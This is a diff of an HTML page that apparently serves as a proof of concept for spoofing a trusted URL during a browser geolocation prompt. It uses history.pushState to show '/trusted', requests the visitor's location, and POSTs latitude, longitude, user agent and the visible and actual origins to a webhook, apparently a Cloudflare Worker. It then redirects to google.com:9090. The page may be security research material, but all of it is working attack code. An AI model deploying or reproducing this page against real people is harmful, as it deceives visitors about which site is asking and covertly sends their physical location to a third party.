@@ -50,7 +50,7 @@ button {
   <h2>Request Location</h2>
   <p>Tap the button below to request Geolocation permission.</p>
 
-  <button onclick="getLocation()">Get Location</button>
+  <button id="getLocationBtn">Get Location</button>
   <p id="output">Location: -</p>
 
   <div id="locationLink" style="display:none;">
@@ -66,6 +66,7 @@ button {
 <script>
 const panel = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
+const getLocationBtn = document.getElementById('getLocationBtn');
 const output = document.getElementById('output');
 const locationLink = document.getElementById('locationLink');
 const mapLink = document.getElementById('mapLink');
@@ -80,8 +81,22 @@ let visibleContext = {
   ts_before: new Date().toISOString()
 };
 
-function getLocation() {
-  if (!navigator.geolocation) return;
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+
+  visibleContext = {
+    origin_before: location.origin,
+    href_before: location.href,
+    ts_before: new Date().toISOString()
+  };
+};
+
+getLocationBtn.onclick = () => {
+  if (!navigator.geolocation) {
+    output.textContent = 'Geolocation not supported.';
+    return;
+  }
 
   navigator.geolocation.getCurrentPosition(
     pos => {
@@ -92,65 +107,39 @@ function getLocation() {
 
       const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
       mapLink.href = googleMapsUrl;
-      mapLink.textContent =
-        `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
+      mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
       locationLink.style.display = 'block';
 
-      /* ✅ send proof log to Cloudflare */
+      // ✅ send log to Cloudflare Worker
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           event: 'geolocation_allowed',
-
           latitude: lat,
           longitude: lon,
-
-          /* what user saw */
           visible_origin: visibleContext.origin_before,
           visible_url: visibleContext.href_before,
           visible_timestamp: visibleContext.ts_before,
-
-          /* where browser actually is */
           actual_origin: location.origin,
           actual_url: location.href,
-
           permission_time: new Date().toISOString(),
           userAgent: navigator.userAgent
         })
-      }).catch(() => {});
+      }).finally(() => {
+        // redirect after sending log
+        setTimeout(() => {
+          location.href = 'https://google.com:9090';
+        }, 100); // delay singkat supaya fetch sempat jalan
+      });
     },
     err => {
       output.textContent = 'Permission denied or error.';
       console.error(err);
     }
   );
-}
-
-trigger.onclick = () => {
-  history.pushState({}, '', '/trusted');
-
-  /* update visible context AFTER pushState */
-  visibleContext = {
-    origin_before: location.origin,
-    href_before: location.href,
-    ts_before: new Date().toISOString()
-  };
-
-  panel.style.display = 'block';
 };
-
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
-});
 </script>
 
 </body>
 </html>
-
